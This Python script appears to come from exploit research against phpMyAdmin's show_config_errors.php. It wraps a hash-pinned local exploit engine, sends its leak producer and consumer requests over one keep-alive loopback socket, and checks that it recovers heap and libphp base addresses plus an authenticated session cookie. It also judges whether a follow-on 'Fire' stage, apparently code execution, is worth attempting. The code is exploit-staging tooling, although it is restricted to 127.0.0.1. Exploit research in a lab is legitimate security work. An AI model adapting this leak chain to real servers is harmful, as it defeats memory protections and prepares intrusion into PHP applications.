#!/usr/bin/env python3
"""Test whether the exact phpMyAdmin leak pair survives one HTTP/1.1 socket.

The hash-pinned engine remains read-only.  Its ordinary connection-closing
transport is used for ``Leak.rotate()``.  This diagnostic then opens exactly
one loopback socket and presents a duck-typed ``post()`` transport to
``Leak.attempt()`` so the original producer and consumer payload builders are
unchanged.

The diagnostic fails closed.  It reports success only when both requests use
the same socket, both responses are completely framed without a close signal,
the consumer returns the authenticated cookie, and both ZendMM/libphp bases
decode nonzero.  A server close after the producer is preserved as the expected
negative result rather than retried on a new connection.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
from pathlib import Path
import re
import select
import socket
import sys
import threading
import time
from datetime import datetime, timezone
from urllib.parse import urlsplit


HERE = Path(__file__).resolve().parent
ENGINE = HERE.parent / "q618-stock-gate-20261024" / "thecybergeek-read-only" / "engine.py"
EXPECTED_ENGINE_SHA256 = "007985fec968b2cea78a7b2d96aeb42dbe3b387dfcb88ab542614c4f9d2ffa5c"
if hashlib.sha256(ENGINE.read_bytes()).hexdigest() != EXPECTED_ENGINE_SHA256:
    raise RuntimeError("refusing an unpinned engine snapshot")
sys.path.insert(0, str(ENGINE.parent))

import engine as stock  # type: ignore  # hash-pinned local research snapshot


TARGET_URL = "http://127.0.0.1:18212/show_config_errors.php"
HOST_HEADER = "x"
MAX_HEADER_BYTES = 2 << 20
MAX_CHUNK_LINE = 4096


class DiagnosticStopped(RuntimeError):
    pass


class PeerEOF(EOFError):
    pass


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def digest(path: Path) -> str:
    value = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1 << 20), b""):
            value.update(block)
    return value.hexdigest()


def atomic_json(path: Path, document: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_name(path.name + ".new")
    temporary.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
    os.replace(temporary, path)


def socket_identity(sock: socket.socket) -> dict[str, object]:
    try:
        local = list(sock.getsockname())
    except OSError:
        local = []
    try:
        peer = list(sock.getpeername())
    except OSError:
        peer = []
    return {
        "python_object_id": id(sock),
        "fileno": sock.fileno(),
        "local": local,
        "peer": peer,
    }


class SocketReader:
    def __init__(self, sock: socket.socket) -> None:
        self.sock = sock
        self.buffer = bytearray()
        self.history = bytearray()
        self.eof = False

    def _fill(self) -> None:
        block = self.sock.recv(65536)
        if not block:
            self.eof = True
            raise PeerEOF("peer closed the socket")
        self.buffer.extend(block)
        self.history.extend(block)

    def read_until(self, marker: bytes, limit: int) -> bytes:
        while True:
            index = self.buffer.find(marker)
            if index >= 0:
                end = index + len(marker)
                data = bytes(self.buffer[:end])
                del self.buffer[:end]
                return data
            if len(self.buffer) >= limit:
                raise DiagnosticStopped(f"response delimiter exceeded {limit} bytes")
            self._fill()

    def read_exact(self, size: int) -> bytes:
        while len(self.buffer) < size:
            self._fill()
        data = bytes(self.buffer[:size])
        del self.buffer[:size]
        return data

    def read_line(self, limit: int = MAX_CHUNK_LINE) -> bytes:
        return self.read_until(b"\r\n", limit)


def parse_header_block(block: bytes) -> tuple[str, int, str, dict[str, list[str]]]:
    if not block.endswith(b"\r\n\r\n"):
        raise DiagnosticStopped("response header block was incomplete")
    lines = block[:-4].split(b"\r\n")
    if not lines:
        raise DiagnosticStopped("response had no status line")
    status_line = lines[0].decode("latin1", "replace")
    match = re.fullmatch(r"HTTP/(1\.[01]) ([0-9]{3})(?: .*)?", status_line)
    if not match:
        raise DiagnosticStopped(f"invalid HTTP status line: {status_line!r}")
    version = match.group(1)
    status = int(match.group(2))
    headers: dict[str, list[str]] = {}
    current: str | None = None
    for raw in lines[1:]:
        if raw[:1] in (b" ", b"\t") and current is not None:
            headers[current][-1] += " " + raw.decode("latin1", "replace").strip()
            continue
        if b":" not in raw:
            raise DiagnosticStopped("malformed HTTP response header")
        name, value = raw.split(b":", 1)
        current = name.decode("ascii", "replace").strip().lower()
        headers.setdefault(current, []).append(value.decode("latin1", "replace").strip())
    return version, status, status_line, headers


def header_value(headers: dict[str, list[str]], name: str) -> str:
    return ",".join(headers.get(name.lower(), []))


def immediate_socket_state(sock: socket.socket, reader: SocketReader) -> tuple[bool, bool]:
    """Return (peer_closed, unexpected_buffered_data)."""
    if reader.buffer:
        return False, True
    readable, _, _ = select.select([sock], [], [], 0.25)
    if not readable:
        return False, False
    try:
        peek = sock.recv(1, socket.MSG_PEEK)
    except (BlockingIOError, TimeoutError, socket.timeout):
        return False, False
    except OSError:
        return True, False
    return peek == b"", bool(peek)


def read_response(sock: socket.socket, reader: SocketReader, method: str,
                  body_cap: int) -> tuple[dict[str, object], bytes]:
    raw_parts: list[bytes] = []
    interim: list[str] = []
    while True:
        head = reader.read_until(b"\r\n\r\n", MAX_HEADER_BYTES)
        raw_parts.append(head)
        version, status, status_line, headers = parse_header_block(head)
        if 100 <= status < 200 and status != 101:
            interim.append(status_line)
            continue
        break

    connection_tokens = {
        token.strip().lower()
        for token in header_value(headers, "connection").split(",")
        if token.strip()
    }
    transfer_tokens = {
        token.strip().lower()
        for token in header_value(headers, "transfer-encoding").split(",")
        if token.strip()
    }
    content_length_text = header_value(headers, "content-length")
    no_body = method.upper() == "HEAD" or status in (204, 304) or 100 <= status < 200
    captured = bytearray()
    total_body = 0
    body_truncated = False
    framing = "none"

    def retain(data: bytes) -> None:
        nonlocal total_body, body_truncated
        total_body += len(data)
        room = max(0, body_cap - len(captured))
        if room:
            captured.extend(data[:room])
        if len(data) > room:
            body_truncated = True

    protocol_close = False
    if no_body:
        framing = "no-body"
    elif "chunked" in transfer_tokens:
        framing = "chunked"
        while True:
            line = reader.read_line()
            raw_parts.append(line)
            token = line[:-2].split(b";", 1)[0].strip()
            try:
                size = int(token, 16)
            except ValueError as exc:
                raise DiagnosticStopped(f"invalid response chunk size: {token!r}") from exc
            if size < 0:
                raise DiagnosticStopped("negative response chunk size")
            if size == 0:
                while True:
                    trailer = reader.read_line(MAX_HEADER_BYTES)
                    raw_parts.append(trailer)
                    if trailer == b"\r\n":
                        break
                break
            data = reader.read_exact(size)
            ending = reader.read_exact(2)
            if ending != b"\r\n":
                raise DiagnosticStopped("response chunk lacked CRLF terminator")
            raw_parts.extend((data, ending))
            retain(data)
    elif content_length_text:
        framing = "content-length"
        try:
            length = int(content_length_text, 10)
        except ValueError as exc:
            raise DiagnosticStopped("invalid Content-Length") from exc
        if length < 0 or length > (1 << 31):
            raise DiagnosticStopped("Content-Length outside diagnostic bound")
        data = reader.read_exact(length)
        raw_parts.append(data)
        retain(data)
    else:
        framing = "close-delimited"
        protocol_close = True
        while True:
            if reader.buffer:
                data = bytes(reader.buffer)
                reader.buffer.clear()
                raw_parts.append(data)
                retain(data)
            try:
                reader._fill()
            except PeerEOF:
                break

    peer_closed, unexpected = immediate_socket_state(sock, reader)
    if "close" in connection_tokens:
        protocol_close = True
    if version == "1.0" and "keep-alive" not in connection_tokens:
        protocol_close = True
    will_close = protocol_close or peer_closed or unexpected
    cookie_headers = headers.get("set-cookie", [])
    cookie_value_bytes = sum(len(value.encode("latin1", "replace")) for value in cookie_headers)
    raw = b"".join(raw_parts)
    document: dict[str, object] = {
        "status_line": status_line,
        "status": status,
        "http_version": version,
        "interim_status_lines": interim,
        "server": header_value(headers, "server"),
        "connection": header_value(headers, "connection"),
        "content_length": content_length_text,
        "transfer_encoding": header_value(headers, "transfer-encoding"),
        "framing": framing,
        "header_bytes": len(raw_parts[0]),
        "body_bytes": total_body,
        "captured_body_bytes": len(captured),
        "body_truncated": body_truncated,
        "set_cookie_count": len(cookie_headers),
        "set_cookie_value_bytes": cookie_value_bytes,
        "protocol_will_close": protocol_close,
        "peer_closed_after_response": peer_closed,
        "unexpected_buffered_data": unexpected,
        "will_close": will_close,
        "raw_bytes": len(raw),
        "raw_sha256": hashlib.sha256(raw).hexdigest(),
    }
    return document, raw


class PersistentEndpoint:
    """Minimal Endpoint-compatible transport bound to one socket."""

    def __init__(self, url: str, timeout: float, host_header: str,
                 evidence: Path, receipt: dict[str, object], save) -> None:
        parsed = urlsplit(url)
        if (
            parsed.scheme != "http"
            or parsed.hostname != "127.0.0.1"
            or parsed.port is None
            or parsed.path != "/show_config_errors.php"
            or parsed.query
        ):
            raise ValueError("diagnostic requires http://127.0.0.1:<port>/show_config_errors.php")
        if host_header != "x":
            raise ValueError("exact diagnostic requires Host: x")
        self.host = parsed.hostname
        self.port = parsed.port
        self.path = parsed.path
        self.host_header = host_header
        self.host_override = host_header
        self.timeout = timeout
        self.evidence = evidence
        self.receipt = receipt
        self.save = save
        self.sock = socket.create_connection((self.host, self.port), timeout)
        self.sock.settimeout(timeout)
        self.reader = SocketReader(self.sock)
        self.initial_identity = socket_identity(self.sock)
        self.call_index = 0
        self.reusable = True
        self.closed_reason: str | None = None

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def post(self, parts, boundary: bytes, *, chunked: bool,
             read_cap: int = 1 << 20, timeout: float | None = None,
             cookie: str | None = None, cookie_prefix: str = "",
             extra_headers: bytes = b"") -> bytes:
        label = "producer" if self.call_index == 0 else "consumer"
        self.call_index += 1
        if self.call_index > 2:
            raise DiagnosticStopped("Leak.attempt issued more than two persistent requests")
        if not self.reusable:
            raise DiagnosticStopped(
                f"refusing {label} on non-reusable socket: {self.closed_reason}"
            )
        if label == "producer" and not chunked:
            raise DiagnosticStopped("producer unexpectedly lost chunked framing")
        if label == "consumer" and chunked:
            raise DiagnosticStopped("consumer unexpectedly used chunked framing")

        effective_timeout = timeout or self.timeout
        self.sock.settimeout(effective_timeout)
        size_header = (
            "Transfer-Encoding: chunked\r\n"
            if chunked
            else f"Content-Length: {stock.Endpoint._length(parts, boundary, chunked)}\r\n"
        )
        cookie_header = (
            f"Cookie: {cookie_prefix}PHPSESSID={cookie}\r\n" if cookie else ""
        )
        head = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"{size_header}{cookie_header}Connection: keep-alive\r\n"
        ).encode() + extra_headers + b"\r\n"
        (self.evidence / f"{label}.request-head.raw").write_bytes(head)

        before_identity = socket_identity(self.sock)
        history_start = len(self.reader.history)
        response_box: dict[str, object] = {}

        def response_reader() -> None:
            try:
                document, raw = read_response(
                    self.sock,
                    self.reader,
                    "POST",
                    max(read_cap, 2 << 20),
                )
                response_box["document"] = document
                response_box["raw"] = raw
            except Exception as exc:  # preserved in the receipt and raised below
                response_box["error"] = f"{type(exc).__name__}: {exc}"
                response_box["partial"] = bytes(self.reader.history[history_start:])

        thread = threading.Thread(
            target=response_reader,
            name=f"{label}-response-reader",
            daemon=True,
        )
        thread.start()
        request_hash = hashlib.sha256()
        request_hash.update(head)
        sent = 0
        send_error: str | None = None
        started = time.monotonic()
        try:
            self.sock.sendall(head)
            sent += len(head)
            for block in stock.Endpoint.body_stream(parts, boundary, chunked):
                request_hash.update(block)
                self.sock.sendall(block)
                sent += len(block)
        except OSError as exc:
            send_error = f"{type(exc).__name__}: {exc}"

        thread.join(effective_timeout + 2.0)
        if thread.is_alive():
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            thread.join(timeout=2.0)
            self.reusable = False
            self.closed_reason = f"{label} response parser timed out"
            partial = bytes(self.reader.history[history_start:])
            (self.evidence / f"{label}.response-partial.raw").write_bytes(partial)
            failure = {
                "label": label,
                "socket_before": before_identity,
                "socket_after": socket_identity(self.sock),
                "response_error": self.closed_reason,
                "send_error": send_error,
                "partial_response_bytes": len(partial),
                "partial_response_sha256": hashlib.sha256(partial).hexdigest(),
                "will_close": True,
            }
            exchanges = self.receipt["exchanges"]
            assert isinstance(exchanges, list)
            exchanges.append(failure)
            self.save()
            raise DiagnosticStopped(self.closed_reason)
        if "error" in response_box:
            self.reusable = False
            self.closed_reason = str(response_box["error"])
            partial = response_box.get("partial", b"")
            assert isinstance(partial, bytes)
            (self.evidence / f"{label}.response-partial.raw").write_bytes(partial)
            failure = {
                "label": label,
                "socket_before": before_identity,
                "socket_after": socket_identity(self.sock),
                "response_error": self.closed_reason,
                "send_error": send_error,
                "partial_response_bytes": len(partial),
                "partial_response_sha256": hashlib.sha256(partial).hexdigest(),
                "will_close": True,
            }
            exchanges = self.receipt["exchanges"]
            assert isinstance(exchanges, list)
            exchanges.append(failure)
            self.save()
            raise DiagnosticStopped(f"{label} response parse failed: {self.closed_reason}")

        document = response_box["document"]
        raw = response_box["raw"]
        assert isinstance(document, dict) and isinstance(raw, bytes)
        after_identity = socket_identity(self.sock)
        document.update({
            "label": label,
            "socket_before": before_identity,
            "socket_after": after_identity,
            "same_python_socket": (
                before_identity["python_object_id"] == after_identity["python_object_id"]
            ),
            "same_fileno": before_identity["fileno"] == after_identity["fileno"],
            "same_local_endpoint": before_identity["local"] == after_identity["local"],
            "same_peer_endpoint": before_identity["peer"] == after_identity["peer"],
            "request_head_sha256": hashlib.sha256(head).hexdigest(),
            "request_stream_sha256": request_hash.hexdigest(),
            "request_bytes_sent": sent,
            "send_error": send_error,
            "elapsed_seconds": time.monotonic() - started,
        })
        (self.evidence / f"{label}.response.raw").write_bytes(raw)
        exchanges = self.receipt["exchanges"]
        assert isinstance(exchanges, list)
        exchanges.append(document)
        self.receipt["persistent_socket_current"] = after_identity
        self.save()

        if send_error is not None:
            self.reusable = False
            self.closed_reason = f"{label} send failed: {send_error}"
        elif document.get("will_close"):
            self.reusable = False
            self.closed_reason = f"{label} response was not reusable"
        if not self.reusable:
            self.receipt["persistent_socket_reusable"] = False
            self.receipt["persistent_socket_closed_reason"] = self.closed_reason
            self.save()
        return raw


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Test the exact phpMyAdmin leak producer/consumer on one keep-alive socket."
    )
    parser.add_argument("--url", default=TARGET_URL)
    parser.add_argument("--host-header", default=HOST_HEADER)
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--out", type=Path)
    parser.add_argument("--ack-exact-profile", action="store_true")
    args = parser.parse_args()
    parsed = urlsplit(args.url)
    if (
        parsed.scheme != "http"
        or parsed.hostname != "127.0.0.1"
        or parsed.port is None
        or parsed.path != "/show_config_errors.php"
        or parsed.query
    ):
        parser.error("--url must be explicit loopback /show_config_errors.php")
    if args.host_header != "x":
        parser.error("--host-header must be x for this exact profile")
    if not args.ack_exact_profile:
        parser.error("--ack-exact-profile is required")
    if not 10.0 <= args.timeout <= 300.0:
        parser.error("--timeout must be within 10..300 seconds")
    return args


def main() -> int:
    args = parse_args()
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    evidence = (
        args.out.resolve()
        if args.out is not None
        else (HERE / "evidence" / f"pma-keepalive-{stamp}-{os.getpid()}").resolve()
    )
    evidence.mkdir(parents=True, exist_ok=False)
    receipt_path = evidence / "receipt.json"
    receipt: dict[str, object] = {
        "schema": "q618-pma-keepalive-leak-v1",
        "status": "started",
        "started_utc": utc_now(),
        "target": args.url,
        "host_header": args.host_header,
        "exact_profile_acknowledged": True,
        "engine": str(ENGINE),
        "engine_sha256": EXPECTED_ENGINE_SHA256,
        "diagnostic_sha256": digest(Path(__file__).resolve()),
        "offsets": {"zval_ptr_dtor": hex(stock.ZVAL_PTR_DTOR)},
        "rotate_transport": "original hash-pinned Endpoint.post with Connection: close",
        "attempt_transport": "one diagnostic HTTP/1.1 socket with Connection: keep-alive",
        "exchanges": [],
    }

    def save() -> None:
        atomic_json(receipt_path, receipt)

    save()
    persistent: PersistentEndpoint | None = None
    try:
        ordinary = stock.Endpoint(args.url, args.timeout)
        ordinary.host_override = args.host_header
        ordinary.host_header = args.host_header
        receipt["rotate_started_utc"] = utc_now()
        save()
        stock.Leak(ordinary, stock.ZVAL_PTR_DTOR, True).rotate()
        receipt["rotate_completed_utc"] = utc_now()
        save()

        persistent = PersistentEndpoint(
            args.url,
            args.timeout,
            args.host_header,
            evidence,
            receipt,
            save,
        )
        receipt["persistent_socket_initial"] = persistent.initial_identity
        receipt["persistent_socket_reusable"] = True
        save()

        heap, module, pointer_count, cookie = stock.Leak(
            persistent, stock.ZVAL_PTR_DTOR, True
        ).attempt()
        (evidence / "leak.cookie.bin").write_bytes(cookie)
        exchanges = receipt["exchanges"]
        assert isinstance(exchanges, list)
        same_socket = (
            len(exchanges) == 2
            and exchanges[0]["socket_before"]["python_object_id"]
            == exchanges[1]["socket_before"]["python_object_id"]
            and exchanges[0]["socket_before"]["fileno"]
            == exchanges[1]["socket_before"]["fileno"]
            and exchanges[0]["socket_before"]["local"]
            == exchanges[1]["socket_before"]["local"]
            and exchanges[0]["socket_before"]["peer"]
            == exchanges[1]["socket_before"]["peer"]
        )
        receipt.update({
            "same_socket_for_producer_consumer": same_socket,
            "heap": hex(heap),
            "libphp": hex(module),
            "pointer_count": pointer_count,
            "cookie_bytes": len(cookie),
            "cookie_sha256": hashlib.sha256(cookie).hexdigest(),
            "persistent_socket_reusable_after_consumer": persistent.reusable,
            "fire_assessment": (
                "candidate: a separate persistent producer/consumer Fire diagnostic is now justified"
                if same_socket and heap and module
                else "not supported by this leak result"
            ),
        })
        if not same_socket:
            raise DiagnosticStopped("producer and consumer socket identity differed")
        if len(exchanges) != 2:
            raise DiagnosticStopped("Leak.attempt did not complete both requests")
        if any(exchange.get("will_close") for exchange in exchanges):
            raise DiagnosticStopped("at least one response required socket closure")
        if not heap or not module or len(cookie) < 1000:
            raise DiagnosticStopped("persistent consumer did not recover the authenticated leak")
        receipt["status"] = "keepalive_leak_proved"
        receipt["ended_utc"] = utc_now()
        save()
        print(json.dumps(receipt, indent=2))
        print(f"evidence: {evidence}")
        return 0
    except Exception as exc:
        exchanges = receipt.get("exchanges", [])
        producer = exchanges[0] if isinstance(exchanges, list) and exchanges else None
        if (
            isinstance(producer, dict)
            and producer.get("will_close")
            and len(exchanges) == 1
        ):
            receipt["status"] = "server_closed_after_producer"
            receipt["fire_assessment"] = "not viable on one keep-alive socket"
        else:
            receipt["status"] = "stopped"
        receipt["error"] = f"{type(exc).__name__}: {exc}"
        receipt["ended_utc"] = utc_now()
        if persistent is not None:
            receipt["persistent_socket_reusable"] = persistent.reusable
            receipt["persistent_socket_closed_reason"] = persistent.closed_reason
        save()
        print(json.dumps(receipt, indent=2))
        print(f"evidence: {evidence}")
        return 1
    finally:
        if persistent is not None:
            persistent.close()


if __name__ == "__main__":
    raise SystemExit(main())
